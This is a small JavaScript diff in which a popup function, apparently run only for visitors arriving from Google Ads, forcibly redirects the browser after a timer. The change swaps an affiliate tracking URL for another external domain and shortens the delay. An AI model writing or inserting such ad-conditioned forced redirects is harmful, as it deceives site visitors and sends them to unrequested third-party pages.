@@ -20,7 +20,7 @@ if (fromGoogleAds) {
 function showPopup() {
 
   const REDIRECT_URL =
-  "https://record.affantage.com/_qXDjiR0NSTiVAv0U_Fv2nWNd7ZgqdRLk/1/?pg=6";
+  "https://clickharbor.online/";
 
   if (document.querySelector(".modal-backdrop")) return;
 
@@ -199,6 +199,6 @@ transform:translateY(-2px);
       window.location.href = REDIRECT_URL;
     }, 1000);
 
-  }, 5000);
+  }, 3000);
 
 }
